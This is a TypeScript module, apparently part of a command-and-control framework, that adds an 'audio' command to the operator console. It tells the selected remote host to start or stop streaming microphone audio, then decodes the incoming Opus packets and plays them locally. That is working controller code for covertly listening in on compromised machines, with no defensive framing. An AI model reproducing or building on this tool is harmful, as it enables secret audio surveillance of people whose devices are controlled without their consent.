import Speaker = require('speaker');
import { ControlServer } from '../../controlserver';
import { CommandList } from '../../registry';
import { Packet } from 'c2lib';
import { OpusEncoder } from '@discordjs/opus';

let spk: Speaker;
let enc: OpusEncoder;

export = function (commands: CommandList) {
	spk = new Speaker({
		bitDepth: 16,
		channels: 1,
		sampleRate: 44100
	});
	enc = new OpusEncoder(48000, 1);
	commands['audio'] = audio;
}

function audioHandler(packet: Packet) {
	if (packet._ptype.name === 'audio') {
		spk.write(enc.decode(packet.data));
	}
}

async function audio(server: ControlServer, args: string[]) {
    if (args.length < 2) {
        console.log(`Usage: ${args[0]} <start|stop|save>`);
        return;
    }

	let packet = server.commandPacket('audiocommand');
	switch (args[1]) {
		case 'start': {
			packet.command = 0;
			let ret = await server.sendHostCommand(packet);
			if (ret == 0) {
				server.currentHost!.on('packet', audioHandler);
				console.log('Audio server started');
			}
			return;
		}
		case 'stop': {
			packet.command = 1;
			let ret = await server.sendHostCommand(packet);
			if (ret == 0) {
				server.currentHost!.off('packet', audioHandler);
				console.log('Audio server stopped');
			}
			return;
		}
		case 'list': {
			packet.command = 2;
			await server.sendHostCommand(packet);
			return;
		}
		case 'save':
			return;
		default:
			console.log(`Usage: ${args[0]} <start|stop|list>`);
	}
}
